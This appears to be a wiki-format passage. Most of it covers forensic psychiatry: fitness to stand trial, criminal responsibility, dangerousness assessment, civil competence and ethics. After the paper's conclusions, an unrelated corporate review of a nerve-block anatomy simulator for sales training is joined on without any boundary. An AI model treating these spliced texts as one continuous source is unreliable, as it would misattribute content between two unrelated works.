A ruling that the accused is not fit (or competent) to stand trial triggers a decision by the court to transfer the accused to a psychiatric facility with the expectation that treatment will restore competence.  The question for clinicians revolves on what parameters to use to predict restorability of competence, which relates to an adequate response to treatment.   

Assessments for fitness to stand trial, or capacity for processability, are a frequent reason to request a forensic assessment.  Persons who are mentally ill at the time of trial cannot be tried; the trial stops until the person improves or regains his sanity.  A person cannot be tried in absentia, meaning the person has to be present, or be properly represented by counsel, at the time of the trial.  Being present means both physically and mentally present because it is assumed that if the person is mentally ill, it is tantamount to not being present in the proceedings, the mind being somewhere else.  To this end, the person may be remanded to a forensic facility and it is expected that, once treatment is instituted as improvement takes place, the person will be returned to court as competent and the trial will continue.  As in many other forensic functions, diagnostically, the issue is not whether the person has a particular mental condition, but whether current symptoms would preclude the continuation of the trial.  

Criminal responsibility is a legal construct that intends to gauge the mental condition of the accused at the time of the offence.  Ingrained in most legal systems is the concept that offenders who are mentally capable at the time of trial, but who were mentally ill at the time the offence was committed, are to be managed through other dispositions than those that apply to any other regular offender.  To this effect, once the issue of fitness to stand trial is decided, the next step in the process is to assess whether the accused was the perpetrator of the crime.  This step ends with a finding of innocence or guilt.  On the assumption that the accused was indeed the culprit the process tries then to determine a level of responsibility to ascribe for the unlawful behaviour.  If the accused could demonstrate that, at the time of the offence, his or her mental faculties were impaired by virtue of mental illness, the court may find that requirements to establish a guilty mind (mens rea) have not been met and proceeds to apply insanity regulations as stipulated by the law.  These regulations include the legal tests used to decide the level at which a mental condition has impacted on competence to know, to understand or to appreciate the nature of the crime with which the person is charged.  A finding that the competence of the accused was severely affected leads to a declaration that he or she was &quot;not criminally responsible because of a mental condition,&quot; or similar wording such as &quot;not guilty by reasons of insanity.&quot;  

Forensic psychiatrists are often required to advise the court about the level of criminal responsibility to be ascribed to the accused.  A finding of not being criminally responsible implies that the person committed the act (actus reus), but is nonetheless, absolved in the eyes of society for not having a guilty mind (mens rea); such a finding precludes criminal sanctions.  Criminal responsibility is a social construct and cannot be measured scientifically; it is only the judge or jury that can decide what level to ascribe to the accused. 

In some countries the issue in law is to decide whether an accused should be considered imputable.  Imputability differs from criminal responsibility in that it refers to the fact that the accused, on account of suffering from a mental condition, cannot be considered as capable of having committed the crime.  The concept derives from Roman law where &quot;demens, furiosus et mentecaptus&quot; (demented, maniacs and mentally retarded) as well as infants below the age of seven were considered incapable of having the malice aforethought to form the intent to commit a crime.  If the person was lacking malice and intent, then, he or she could not be imputed with authorship of a crime.  Forensic psychiatrists are often required to arrive at these diagnostic decisions.  

As in the case of fitness to stand trial, the basic element of a determination on criminal responsibility is not whether the person had a mental illness at the time the offence was committed.  Rather, what is important is to determine whether such illness was severe enough so as to produce incapacity to meet the elements required to establish criminal responsibility, partially or totally.  It is for the mental health specialist to evaluate whether the accused had been mentally ill at the time of the offence, but it is for the court to decide whether the mental illness had produced an incapacity that rendered the person not criminally responsible.  The role of the mental health specialist is to conduct an in-depth assessment of the personality and mental condition at present and of the claims that the accused was mentally ill at the time of the offence, and, then, to gauge the severity of the incapacity that it might have caused so as to be able to advise the court appropriately.         

Legislation to determine the level of criminal responsibility or similar legal concepts is found in the laws of every country.  In many of the countries that follow the common law system the test of criminal responsibility follows the McNaughton Rules of Insanity or a variance of the same.  The most important of these rules reads:
To establish a defense on the ground of insanity it must be clearly proved that at the time of the committing of the act the accused party was labouring under such a defect of reason, from disease of the mind, as not to know the nature and quality of the act he was doing; or, if he did know it, that he did not know he was doing what was wrong. 

A decision that the accused was not criminally responsible triggers the application of special disposition measures.  Legislation in many countries dictates that persons who are found not criminally responsible should be sent to special facilities &quot;for the criminally insane&quot; for treatment, supposedly, until the person gets better.  In practice, the determination that the person has improved enough to be released to the community is vested on semi-autonomous quasi-judicial Boards, on the courts, on a political appointee, or as in some countries, on the psychiatrists at forensic wards of mental hospitals.  Once sufficient improvement has been observed, the person could be released, but would be expected to follow treatment arrangements in the community with enforced compliance under condition of returning to hospital if a relapse occurs or if the person is not compliant.  In some advanced mental health systems and depending on the seriousness of the offence and the severity of the mental condition, a court of law may decide not to send the accused to a hospital, but to issue a community treatment order whereby the person abides to enter into a treatment program as specified by the court and under the control of some quasi-judicial body.  

Apart from very young children who are deemed not to have the necessary requirements to form a guilty mind by virtue of their emotional and neurological immaturity, everybody else is deemed to be responsible unless proven otherwise based on the presence of some mental condition.  The law provides for a gradient for criminal responsibility, from none at all to fully responsible (Arboleda-Flórez and Deynaka, 1999).  

====Points to remember====
'''FITNESS TO STAND TRIAL'''

'''CRIMINAL RESPONSIBILITY'''

1. Mental illness at time of trial

2. Everybody is deemed to be fit unless the contrary is demonstrated

3. There are two elements - mental illness and resulting incapacity

4. Incapacity is the determinative factor

5. Basic elements pertain to capacity to understand basic issues of law at the time of trial such as nature of the proceedings and the consequences that could flow from them, and to communicate with counsel

6. If the person is found unfit and is not dangerous, the legal proceedings could be discontinued or stayed on minor charges  

7. Otherwise, the trial stops and the accused is remanded for treatment until well enough to return to trial

1. Mental illness at time of offence

2. Everybody is deemed to have mens rea unless the contrary is demonstrated 

3. There are two elements - mental illness and resulting incapacity

4. Incapacity is the determinative factor

5. Basic elements pertain to mental condition at time of offence severe enough so as to render the person unable to know or to appreciate that he or she is committing a crime, or unable to form the specific criminal intent

6. The person is sent to a hospital for treatment or is placed on a community treatment order according to mental condition and seriousness of offence

7. Eventually, the person could be released from state control.

Finally, the third important function in criminal proceedings and one that requires a major involvement of forensic psychiatrists is the determination of whether a particular offender is dangerous. Dangerous offender applications demand a high level of expertise on the part of forensic experts who are expected to provide courts with technical and scientific information on risk assessment and prediction of future violence, especially dangerous sexual offending.  Dangerousness determinations rely heavily on a thorough assessment of the personality of the offender, a history of violent behaviour and responses to specific scales intended to measure risk.  Many clinicians are of the opinion that the probability of risk to reoffend is particularly high among certain types of personality and when the last offence is a continuation of the same pattern of escalating violent behaviour in both frequency and severity.  In these applications, the focus is on a history of violent behaviour and the likelihood that it will continue in the future, not the specific diagnosis of a mental condition—although again the diagnosis of some mental disorder may be a requirement for entry into the system.  Likelihood of future violence is determined through an in-depth forensic psychiatric assessment that includes thorough forensic examinations, neurological examinations, neuroimaging and the application of a series of specialized instruments in the form of tests and scales.  Two of these instruments have received worldwide attention, the Hare (1991) Psychopathic Checklist (PCL-R), and the HCR-20 (History, Clinical, Risk – 20 questions) devised by Webster (1996).  While the former is more appropriate for long-term predictions regarding psychopathic offenders, the latter is more in use for the management of regular mental patients in clinical settings.  Despite claims to more objectivity, these instruments, like other predictive instruments that use clinical and prospective variables, rely heavily on the clinical insights and technical skills of the clinician.

Mental patients have traditionally been considered prone to violence, but results from research on whether mental illness causes violence per se, or whether violence is only associated with mental illness through a host of different variables such as age, gender, or socio-economic status has not yielded a definite answer.  It is acknowledged, however, that some mental patients who suffer from particular mental conditions alone or in combination with substance abuse disorders, or comorbid with antisocial personality disorders, or those whose mental symptoms over-ride personal controls could be more violent than other mental patients, or the population at large. 

The courts expect that forensic psychiatrists are in a position to provide advice on proper venues for disposition once an offender is found not fit to stand trial, not criminally responsible on account of mental illness or is deemed dangerous.  The task for forensic psychiatrists in these situations is to gauge the level of systems interface in relation to different types of receiving and treating institutions. Hospitals for the criminally insane, mental hospitals for civilly committed patients, penitentiary hospitals for mentally ill inmates, as well as hospital wings in local jails, are all part of the mental health system, and their interdependency has to be acknowledged for purposes of system integration and budgeting.  How mental patients are managed in prisons systems is also a major matter of concern.  Deterrence, punishment, rehabilitation, retribution and incapacitation are among the reasons usually given for the need to impose a sentence.  Of these, the one that would most directly involve mental health professionals is rehabilitation, especially because mental illness is rampant in prison and many jails or penitentiaries are practically extensions of the mental health system (Konrad, 2002).  In particular, jails in some communities are part and parcel of the local mental health system.  Estimates of prevalence of mental illness among inmates in some systems go as high as 65% in any given year.  Policies of deinstitutionalization have been blamed for the large number of mental patients in prisons in that having closed the mental hospitals no alternatives have been provided for them in the community.  Thus, rather than the actual policies to relocate mental patients back to their communities the real culprit seems to be improper implementation of the policies and lack of adequate resources.      

Apart from regular mental conditions among prisoners many of whom having been mentally ill prior to be sentenced to a prison term, prison environments do produce special mental problems.  Research on these problems has a long history.  Considerable work was done in Germany during the nineteenth century on suicide in prisons, the prevalence of mental conditions among prisoners, and the influence of the prison environment as a risk factor to psychiatric illness.  The term prison psychosis originated from that research; it describes an acute psychotic breakdown as a result of the highly stressful situations in the prison.  Equally, members of the same school of German prison research, described Ganser Syndrome, a peculiar syndrome in which the person appears confused and psychotic and gives answers that are approximate or &quot;past the point&quot; of the question, such as answering that a chair has three legs instead of four.  This syndrome is transitory and has been classified as a form of pseudo-dementia.         

The high proportion of individuals who are seriously mentally ill in prison environments is a source of major administrative concern.  Mentally ill prisoners have to be housed in an institution that is not typically mandated or funded to provide clinical services.  Their needs compete with many other more pressing needs in prisons and resources have to be allocated that are taken away from other health priorities within the system such as treatment for prisoners who suffer from AIDS, hepatitis, tuberculosis, or sexually transmitted diseases.  Mental patients often require specialized correctional measures to protect them from suicidal behaviours, from being abused or assaulted by other inmates, or from assaulting others.  In general, mental patients in prisons require extra services and higher staff ratios, but the attention given them can never compare with the quality of care at mental hospitals or at psychiatric units in general hospitals.  

Forensic psychiatrists are usually in charge of conducting assessments and providing treatment to mentally ill inmates, but their jobs continue once the inmates are released into the community.  On exit from the legal-correctional system forensic psychiatrists are expected to provide expert knowledge on matters such as readiness for parole, predictions of recidivism, commitment legislation applicable to offenders about to be released, the phenomenon of double revolving doors for the mentally ill in prisons and hospitals and treatment of ex-inmates in the community.  

The need for forensic psychiatric services in all these justice/correctional activities is dictated by the close relationship between the two systems that have developed over the years out of the realization that the population served by both psychiatry and corrections is often one and the same.  Many ethical, political, and human rights issues arise out of these situations, but with proper controls and safeguards in the system, compassionate and enlightened programs could be developed and implemented in forensic settings and long stay mental hospitals while community alternatives such as half-way houses could be sought to replace long term institutionalization without impacting on the safety of the public.

== Forensic Legal Operations in Civil Law==

Civil Law is defined as the body of legal decisions, in Common Law countries, or rules and regulations in those countries that follow Romano-Germanic systems of law that govern the relationship among individuals.  Ordinarily, breaches of those rules by one person against another cause conflicts that often end up in courts for adjudication.  Psychiatrists and other mental health specialists are regularly required to conduct assessments with a view to determine the presence of mental or emotional problems in one of the parties.  However, most issues arising out of Civil Law that require mental health assessments pertain to the individual having lost the ability to manage particular situations or to discharge particular functions.  At play are two major concepts, capacity and competence.  Although there is a tendency to use these two concepts interchangeably, they are not the same.  In general, capacity refers specifically to the presence of physical, emotional and cognitive abilities necessary to make decisions or to engage in a course of action.  Competency, on the other hand, refers more specifically to the legal consequences of not having capacity.  In these definitions, &quot;capacity&quot; is a medical function whereas &quot;competency&quot; is a legal decision; while capacity refers to symptoms affecting the individual, competency refers to the impact those symptoms may have on legal and social standing.  Capacity has also been defined as the ability to make an informed choice with respect to a specific decision, and competence as the ability to process and understand information and to make well-circumscribed decisions based on that understanding.  As is obvious, these definitions ascribe to both concepts a legal determinism together with expected teleological consequences.  Whatever the definition, however, in the end, a determination of incapacity leading to a finding of incompetence becomes a matter of social control that is used to legitimize the application of social strictures to an individual.  

Assessments of capacity and competence are needed in multiple situations that range from cases when psychiatric assessments are required in order to specify the impact and emotional effects of injuries on a third party involved in a motor vehicle accident to capacity to write a will or to enter into contracts.  These determinations could also apply to psychological autopsies in order to assess testamentary capacity on suicidal cases or cases of sudden death, or evaluations for fitness and incapacity to work and, of late in many countries, evaluations to determine access to benefits contemplated in disability insurance.  In most of these situations the issue at hand is a determination of capacity and competence to perform some function, or the evaluation of autonomous decision making by mentally ill persons, impaired persons or those who have suffered brain damage or are affected by dementia.       

The United Nations Declaration on Human Rights, Paragraph 6, states that everyone has the right to recognition everywhere as a person before the law.  However, having inherent legal rights is not the same as having legal capacity to benefit from them, since this capacity may be compromised among persons suffering from mental disorders. Given the importance of being able and allowed to exercise one’s rights as an assertion of personal autonomy, any abrogation of that power generally requires a judicial decision.  Hence, in most instances (medical treatment settings sometimes constituting an exception) a medical decision that a person has lost capacity enters into effect only after a legal determination of incompetence has been completed.   

There is always a presumption of capacity; a person is assumed to be capable and competent to make decisions unless proven otherwise. Decision making capacity requires an ability to understand, to appreciate, and to reason about the relevant information or situation confronting the person, to make an informed choice and to be able to communicate it.  Clinicians rely on their clinical knowledge, their judgment and on special scales to make these assessments.  However, the presence of a major mental or physical condition does not in and of itself produce incapacity in general or for specific functions. Even in the presence of a condition that may affect capacity, a person may still be competent to carry out some functions, not just because capacity fluctuates from time to time, but also because competence is not an all or none concept.  Competence is tied to the specific decision or function to be accomplished.  For example, a stroke may render a person incapacitated to drive a motor vehicle and, therefore, incompetent to drive, but the person could still have the capacity to enter into contracts or to manage personal financial affairs. With time and proper rehabilitation, the person might be able to regain capacity to drive. Given that incapacity is often time-limited, findings of incompetence should be reviewed at appropriate intervals. Although the subjects of capacity evaluations should be informed of the purpose of the assessment, consent is not typically required for an evaluation to be completed.  Capacity assessments are protracted and take time so it is advisable to use a screening test of capacity and to do a full assessment only if the person fails the screening test. This will reduce the burden on both the subject of the assessment and the evaluator if the screening test is passed.  As is the case in criminal law, in civil law what is important is not just a diagnosis—which here may not even be required as a threshold determination—but the incapacity to execute some functions caused by the symptoms of the medical condition.  For example, persons suffering from a serious bipolar disorder may during the manic behaviour enter into dubious business deals or spend foolishly the personal or the family fortunes.  Under these circumstances the person could be declared incompetent to make financial decisions until the manic symptoms are brought under control.  Not to take this step may leave the medical practitioner open to litigation for negligence.   

The legal tests for competency are usually defined in broad statutory phrases that are, at times, difficult to operationalize.  When conducting incapacity evaluations, clinicians should examine whether the patient:

a) Understands what the problem is 

b) Knows what the matters under potential litigation are and why

c) Knows the facts in relation to matters being questioned (whether financial, custody of children, health, etc.)
d) Is able to process information in a factual and rational way, and 

e) Can function in his or her regular environment.  

Clinicians should, then, assess the demands of the environment on the person, the adequacy of the sources of information, and whether more examinations or tests are required.  The gist of the evaluation is not only to determine the presence of incapacity, but also to evaluate how best the person could cope under the circumstances, what aides would be required to help the person cope better, and how best to protect the interest and rights of the person.  As such, competency evaluations tax the clinical knowledge of the expert as well as his ethical qualities and his knowledge of the systems and resources available in the community.  

A determination of incapacity (a medical function) that could lead to a finding of incompetence (a legal decision) legitimizes the restriction on the person’s powers to make autonomous decisions. Given the serious consequences of a decision of incompetence on a person’s autonomy, clinicians have an ethical duty to base their decisions on the best available clinical evidence. 

== Systems Interactions ==
 
The double revolving door phenomenon whereby mental patients circulate between mental institutions and prisons has made forensic psychiatrists deeply aware of the interactions in the mental health system and the links between this system and the justice and correctional systems.  By virtue of their involvement in legal matters forensic psychiatrists have developed a major interest in the drafting and the application of mental health legislation, especially on the issues of involuntary commitment that in many countries is based on determination of dangerousness (application of police power) as opposed to just a need for treatment (parens patriae) concepts.  In addition, forensic psychiatrists are asked for expertise in the management of mentally ill offenders and assessment of legal protections for incompetent persons.  Given that one major area of their expertise is the assessment of violence and the possibility of future violent behaviour through the evaluation of dangerousness via risk assessment and risk management methodologies, forensic psychiatrists are usually called upon to make decisions on risk posed by violent civilly committed patients.  Issues of coercion and protection of human rights of the mentally ill are often major considerations to take into account during these evaluations (Arboleda-Flórez, 2008).  Protection of human rights and the acceptance that deprivation of liberty should be only a matter of last recourse has led some jurisdictions to implement special laws for outpatient commitment.  These regulations enjoin the patient to accept and comply with special conditions in order to remain free, such as accepting treatment in the community.    

There is a close interaction between legislation and the development of adequate mental health systems, and the delivery of care whether in institutions or in the community.  Mental health legislation with overly restrictive commitment clauses even for short-term commitment, deinstitutionalization resulting from the closure of old mental hospitals, changes in health care delivery systems towards short admissions to general psychiatric units and subsequent treatment in the community, and the large number of mental patients that end up in jails have created in many countries a sense that the mental health system is adrift.  The growth of Forensic Psychiatry may be due to changes in the law and to a more liberal acceptance of psychiatric explanations of behaviour, but a more immediate reason may be the large number of mental patients in forensic facilities, jails, prisons, and penitentiaries.  Failures of the general mental health system may, therefore, be at the root of the growing importance of Forensic Psychiatry.  

== Ethical Issues ==

Several ethical concerns arise from the involvement of forensic psychiatrists in so many social, clinical and legal areas as have been mentioned in the sections above.  Much ethical debate has resulted about the propriety and ethical imperatives that might be trampled during so many forensic functions and interventions.  Stone (1984), for example, felt so concerned about what could take place that he even opined that it was improper for forensic psychiatrists to appear in legal forums and that to do so would indicate that they were not acting as physicians.  Waving such a threat of excommunication from the medical fold, Stone compels forensic psychiatrists to abandon all legal premises.  To the contrary, Griffith (1998) felt that to do so would be a veritable calamity to vulnerable populations that could expose them to unnecessary hardships and possible abuse.  Appelbaum (1997) took a more conciliatory path and sought to satisfy the queasiness and concerns manifested by Stone by producing a model based on the principles of truth-telling on entrance at the moment of the forensic encounter and subsequent respect for the person undergoing the assessment (Arboleda-Flórez, 2005).   

Important as these theoretical lucubrations on the ethics of forensic psychiatry are, for purposes of this paper only three practical matters will be considered – those relating to expert testimony including the ethical virtues and the skills of the expert and the quality of the expertise, issues arising from double agentry situations and the matter of research on prisoners.    

Expert testimony imposes on forensic psychiatrists an obligation to keep updated on clinical knowledge and on the latest results from research on the subject matter of the particular case.  The forensic expert is considered a master in the application of the medico-legal method that entails deep knowledge of medical issues and legal operations.  Preparation of a legal report or, specially, verbal presentation of evidence, is tantamount to an examination in public of the practitioner’s depth of knowledge and actualization.  Expert evidence demands also that the forensic expert be up to date on issues of research and on technological aids such as laboratory tests or psychological scales that are often used to arrive at a diagnosis.  Forensic practitioners should make a point of knowing in detail the scientific bases of those technologies.  

Knowledge per se is no guarantee that the expert is an ethical person, as this virtue comes from other constructs in the personality make up of the practitioner, however, it is worthwhile to mention some expected virtues in the application of the medico-legal method.  It is expected that the forensic psychiatric expert be aware of the importance of the expert role, the need for rigorous preparation and methodical exploration of alternative conclusions, and the need to anticipate the challenges to be presented at cross examination in court.  In addition, experts should also strive to embody the following qualities:

a. Objectivity in interpreting material evidence

b. Impartiality in elucidating truth regardless of the interests of the parties in conflict

c. Veracity, regardless of social, political or legal consequences

d. Knowledge and skills in clinical evaluation

e. Analytical capacity to correlate clinical findings with the legal question

f. Common sense and application of the law of parsimony (Ockham’s razor)
 
g. Keen critical abilities to avoid assuming extreme positions, premature closure of alternative explanations or believing in the infallibility of one’s clinical findings

h. Excellent grounding in biological, medical and social sciences 

i. Good understanding of legal concepts and terminology, and

j. Grounding and a clear understanding of the ethical conflicts in forensic psychiatry. 

Ignorance of relevant medical or legal facts, inability to remain neutral, dishonesty and blindness to the ethical quagmires of medico-legal work are incompatible with the role of an expert.

Knowledge is a sine qua non condition to determine the quality of the skills the expert brings to an evaluation including being able to choose the best tools required for the assessment and striving to recognize secondary gain for the expert or for the person being evaluated.  Hence, forensic psychiatrists need to verify their conclusions whenever possible via information from third parties, including witnesses, family and friends, who can describe the behaviour of the defendant or litigant, the psychiatric history, and the person’s mental state at the time in question.  Efforts should be made to obtain school, military and hospital records and any other documents that could shed light on the development and the presence of symptoms and on the veracity of the client.  Similarly, in a quest for objectivity in the diagnostic formulation, clinical aids to diagnosis, such as electroencephalogram, diagnostic imaging, laboratory tests and psychological tests are often indicated.  The more the expert bases his conclusions on objective information, the better grounded are likely to be the diagnosis and the conclusions.  Finally, quality of the expertise involves quality in the preparation and presentation of the psychiatric legal report.    

Double agentry refers to the fact that forensic specialists usually see clients who are referred by some agency requesting the evaluation.  The most frequent case is that the person is referred and is under some kind of coercion to attend, or expects that a report will be produced for the referring agency.  Very often, the payment for the evaluation is made by the agency, or the forensic expert is on the hire of the agency.  This makes it impossible not to have a double allegiance, which an ethical practitioner should openly explain to the patient right from the outset of the evaluation.  It would be expected that the practitioner has cleared his involvement with the agency and requested complete independence in the way the evaluation is to be conducted and to arrive at conclusions through a systematic search for answers and to present them even if they are negative to the interest of the hiring agency. Forensic psychiatrists should always be aware that they could not trespass ethical rules no matter what the demands of the master.  Less than that would make of the practitioner a simple hire gun or unscrupulous operator.                        

Finally, in regard to medical research among prisoners it should be kept in mind that research is an area in which major ethical transgressions have occurred throughout history.  Books on medical ethics are full of examples about abuse of patients who are at the same time subjects of research, usually at the hands of their own treating physician.  Abuse of prisoners as subjects of research has not been an exception.  Prisoners have been seen as potential research subjects and have been taken advantage of by providing incentives amounting to trinkets or by abusing their status as a vulnerable population given their condition of subjugation and living in a situation where autonomous decision making would be questionable.  Prisoners may have the capacity to make a decision to become a subject of research, but doubts could be raised about whether such decision was entirely voluntary.    

An ideology of good for science as being a higher value over the deprivation and suffering of few persons seems to have been at the base of the interest to use prisoners as subjects of research.  This ideology would justify the conduct of experiments on human beings without the much needed respect for their autonomy.  This was the ideology that was in place until the end of the Second World War, when, under the impact of the horrors practiced by Nazi doctors (Aziz, 1976) steps were introduced to control research among prisoners and to establish ethical guidelines binding the researchers.  In the United States, for example, concerns about abuse of prisoners for purpose of research led to the appointment of a National Commission for the Protection of Human Subjects of Biomedical and Behavioral Research in 1976.  Recommendations of this Commission include that only prisons characterized by a great deal of openness could allow their inmates to be involved in research, that the prisoner-research subject should enjoy the exercise a high degree of voluntariness and that prisoners should not be deprived access to experimental drugs, if so needed, on account that prisoners are a vulnerable population.  This last recommendation was essential in order to strike a just balance between the protection of the prisoner as a subject of research and his or her capacity and competence to make a considered decision to participate in research.  The vulnerable status of a prisoner does not prevent participation in research for as long as proper guarantees are in place to prevent abuses.  The problem of prisoners becoming subjects of research gets further complicated when so many of them (as described in an earlier section) are also mentally ill.  In these cases a double vulnerability will be present, mental illness that may affect capacity and competence decisions and imprisonment that may affect that ability to make them voluntarily.  Prison administrators should be more vigilant and take extra-precautions to prevent possible abuse of mentally ill prisoners as subjects of research     

== Conclusions ==

Following a historical review to ground the development of Forensic Psychiatry, this paper has dealt with the scope of this specialty and with ethical issues confronting its practitioners.  The paper has enumerated four moments in the development of legal-psychiatric thinking.  The first two moments - evolution in the understanding and appreciation of the relationship between mental illness and criminality and impacts of mental illness on lawful behaviour were applied to underline the increasing scope of Forensic Psychiatry in practically all areas of Criminal Law and in a large number of situations in Civil Law.  The third moment on systems interactions examined issues on the navigating of mentally ill offenders within the three systems of medicine, justice and corrections.  Finally, on the last moment, pertaining to ethics, this paper dealt with issues arisen from the functions of forensic psychiatrists as expert witnesses, the problems with double agentry and the potential for abuse while conducting research on prisoners.

== An Evaluation: Upper Limb PNB Simulator {{ref|delbos2005}} ==

'''The Questions We Needed Answered…'''

• Will the Lippincott simulation program help our novice new hire sales representatives to know the most common surgical procedures in which patients and providers can benefit from peripheral nerve block (PNB) anesthesia/analgesia? 

• Will this program enable these sales representatives to describe how nerve blocks are performed including how nerve stimulators are used to locate a specific nerve, how anesthetic is administered, and the difference between single shot and continuous PNB techniques? 

• Will the program advance our learner’s understanding of the brachial plexus anatomy and help them to have credible conversations with anesthesiologists regarding at least three upper extremity surgical procedures? 

=== Introduction ===

We conducted a learning styles survey at B. Braun Medical in December, 2006 with 120 sales representatives and sales managers. Of this population of employees 85% had more than 5 years of experience with B. Braun Medical, 45% of the group was between 30–42 years old and 46% was older than 43 years old. Males represented 61% of the survey group and females represented 39%.

We received 96 learning styles survey responses (80%), which indicated that 89% of our targeted learners felt that live workshops were the most effective training format. However, the same survey indicated that 62% of our sales team felt videos to be an effective training medium and 52% felt the same about print. The cognitive channel preferences of our learners (Figure 1) were 41% kinesthetic, 41% visual/auditory, and 18% verbal/readers. At the time, we found it interesting that 62% of our sales representatives and sales managers felt training videos to be effective even though we had never produced training videos. This coupled with the fact that 41% of our representatives were inclined towards visual/auditory learning inspired us to begin developing videos and animations as a part of our training curriculum to support both print-based and live classroom activities. 

[[Image:Braun Cognitive Channel Preference Graphic.jpg|350px]]

As can be seen in Figure 2, the B. Braun Medical field force exhibits a multimodal learning style with a slight dominance for a “learn by doing” preference (Kolb methodology), which is supported by the higher prevalence of a body kinesthetic (41%) cognitive channel preference (Fleming methodology).&lt;ref&gt;{{ref|VARK}}&lt;/ref&gt;&lt;ref&gt;{{ref|Kolb1983}}&lt;/ref&gt; Collectively, these findings suggested that we develop a blended curricular approach with an emphasis on either live or virtual experiential training programs.

Figure 2. Dominant learning style of target audience (Kolb model). 
Multimodal is universal, and converging (do/think) is dominant.

We are currently in the process of planning a peripheral nerve block (PNB) training program. Given the diverse learning preferences of our sales team, in addition to the success we have had with the blended training programs that we have developed since December 2006, we plan to build the following learning components into our peripheral nerve block training program.   

• Print-based self-study modules (supplemented with animations and videos)
• A clinical PNB certification program (utilizing simulation tools)
• Live classroom instruction (utilizing simulation tools)
• Presentation skills training
• Observation of best practice skills in simulated customer situations
• Peer-to-peer tutoring in simulated customer environments
• Sales management pull through, coaching and feedback	

This review will be focused on how the Lippincott Upper Limb PNB Simulator Program might address the needs of our learners related to the PNB certification, live classroom instruction and peer-to-peer tutoring components of our planned curriculum.

=== Simulator Program Overview ===

The stated purpose of the Upper Limb Peripheral Nerve Block Simulator Program is to provide a tool to enhance a student/practitioner’s skill in PNB anesthesia. The training DVD is divided into three distinct (and/or interrelated) sections:

1.The “Upper Limb Blocks” section contains 3-D animations, audio narration, written procedures and over 600 references, which reviews all of the essential information related to anatomy, procedural indications, complications and technique needed to learn how to perform an upper extremity PNB.

2.The “Anatomy” section provides learners with a brief description and 3-D animations of the anatomy of the upper extremity as well as the anatomical specifics inherent in each block procedure.

3.The “Simulator” section allows learners to perform each of the peripheral nerve blocks of the upper limbs on a 3-D reconstitution of a real human body based on the Visual Human Project (a mission established in 1989 by the National Institute of Health to build a comprehensive digital library representing the complete, normal adult male and female anatomy. {{ref|NIH}}   

The tutorial gives a very broad overview of the program, but gives no instructions regarding where to start or recommendations related to the best sequence of instruction. I started in the “Upper Limb Blocks” section of the program (Figure 3), which proved to be the best course of action, and found that the other two sections were linked to this primary training section and supported both the fundamental knowledge (Anatomy) and the practice component (Simulator). After selecting “Upper Limb Blocks,” I next needed to select the PNB type to begin instruction (Figure 4). The eleven block procedure selections include: axillary and interscalene brachial plexus blocks, supraclavicular and infraclavicular blocks, mid-humeral block, and median nerve, radial nerve and ulnar nerve blocks for both the elbow and the wrist. 

Figure 3. Home screen

Figure 4. PNB selection screen

I selected the interscalene nerve block training segment, which will be described for the balance of this review. When the interscalene block training portion of the program opened (Figure 5) the training automatically started with an audio narration of a 3-D animation (bottom left navigation button). This narrated animation can be paused, fast forwarded or rewound, or skipped forward or back in larger, logical instructional chunks. The little house icon will take the user back to the upper limb block procedure selector screen (Figure 4). The “Video” button takes the learner to a real-world audio narrated procedure. The “Library” button combines select 3-D, 360 degree animation stills, which can be manually rotated, with accompanying text-based slides that also review the procedure. Imbedded within these slides are hot links to more specific information related to the interscalene nerve block procedure in addition to reference material specifically aligned with the text on the slide.  The “Anatomy” button allows the user to focus specifically on studying the block-specific still graphics. The “Index” button allows learners to rapidly search for specifically needed content via a list of the logical instructional chucks for either the “Animation” or “Library” components of the program (e.g., indications, complications, etc.). The “Animation,” “Anatomy,” “Library,” “Video,” and “Simulation” components of the program are briefly described below. 

Figure 5. PNB Interscalene brachial plexus block home screen

'''Animation:''' The narrated voice over animation begins by describing the clinical indications for an interscalene brachial plexus block, which include providing analgesia and/or anesthesia for surgeries on the shoulder and arm. Next, a variety of procedural contraindications are shared including phrenic paralysis and chronic respiratory disease. The patient’s proper position is explained. The key anatomical landmarks necessary for locating the interscalene groove, which resides between the anterior scalene muscle and middle scalene muscle, is discussed. Locating and marking the stimulating needle puncture site is explained as well as the step by step technique for advancing the needle to the correct bundle of nerves (Figure 6) to elicit an adequate (Figure 7) versus an inadequate (Figure 8) motor response, all while avoiding anatomical areas that could harm the patient like the juglar vein.

Figure 6. Advancing the stimulating needle to the appropriate nerve bundle

Figure 7. Adequate motor response

Figure 8. Inadequate motor response

'''Anatomy:''' Learners who need more detailed instruction can select the “Anatomy” button any time that the narrated voice over animation is running to review the applicable anatomy in greater depth. As can be seen in Figures 9-12, users can manipulate the brachial plexus anatomy by adjusting the viewing angle, magnifying the view, and selecting a variety of anatomical layers; nerves, vasculature, and two different layers of muscle.

Figure 9. Brachial plexus nerves

Figure 10. Brachial plexus vasculature

Figure 11. Brachial plexus inner muscle and lung

Figure 12. Brachial plexus with outer muscle

'''Library:''' Learners who need more detailed or slower instruction can select the “Library” button any time that the narrated voice over animation is running to view a text-based narrative, which is accompanied by a text specific, labeled, anatomical still graphic in addition to a 3-D graphic that can be rotated by the learner to explore different anatomical perspectives. Text on some of the pages is hot linked to additional levels of pertinent content if deeper levels of understanding are desired or required. For example, the word “references” is a hot link within the text shown in Figure 13. If clicked by the user, a detailed list of references, related to “technique,” in this example would, be available to the learner. The user is able to then select any of these listed references for the specific reference detail (Figure 14).

Figure 13. Narrative text with 3-D manipulative graphic

Figure 14. Linked reference list

'''Video:''' Learners who want to see the real-world interscalene block procedure can select the “Video” button any time that the narrated voice over animation is running. This portion of the training program aligns a video of the procedure with voice over narration and accompanying anatomical graphics from the “Animation” and “Anatomy” sections so that the didactic content is contextually connected to practical application (Figure 15).  

Figure 15. Video of interscalene nerve block procedure

